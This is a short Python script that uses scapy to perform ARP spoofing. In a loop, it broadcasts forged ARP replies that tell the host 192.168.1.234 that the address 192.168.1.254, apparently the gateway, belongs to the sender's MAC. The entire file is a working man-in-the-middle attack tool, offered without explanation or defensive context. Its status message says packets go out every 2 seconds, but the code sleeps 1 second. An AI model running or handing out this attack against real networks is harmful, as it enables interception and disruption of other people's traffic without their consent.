import time

from scapy.all import ARP, Ether, sendp

target_ip = "192.168.1.234"
fake_ip = "192.168.1.254"
my_real_mac = "60:ff:9e:0c:29:af"

spoof_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2, psrc=fake_ip, hwsrc=my_real_mac, pdst=target_ip
)

print("[*] Sending spoof packets every 2 seconds. Press Ctrl+C to stop.")
try:
    while True:
        sendp(spoof_packet, count=1, verbose=False)
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[*] Stopping spoofing.")
